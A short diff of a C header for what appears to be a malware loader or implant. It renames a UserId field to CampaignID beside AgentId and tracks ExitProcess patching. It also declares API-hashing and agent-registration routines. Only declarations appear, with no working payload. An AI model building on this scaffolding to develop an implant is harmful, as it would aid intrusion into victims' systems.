@@ -17,10 +17,7 @@
 #endif
 
 typedef struct _Config {
-	CHAR UserId[37];
-#ifdef LOAD_AND_EXIT 
-	CHAR FileId[37];
-#endif
+	CHAR CampaignID[37];
 	CHAR AgentId[37];
 } Config;
 
@@ -29,7 +26,7 @@ typedef struct _LdrInstance {
 	Modules *modules;
 	Config *config;
 	BOOL ExitProcessPatched;
-	PVOID TextSection;
+	
 
 } LdrInstance;
 
@@ -44,5 +41,6 @@ DWORD HashStringW(const wchar_t *str);
 void LdrMain();
 BOOL LdrAllocateCoreStructsAndLoadApis();
 BOOL ParseConfig();
+BOOL LdrRegisterAgent();
 
 void LdrExitThread(NTSTATUS code);
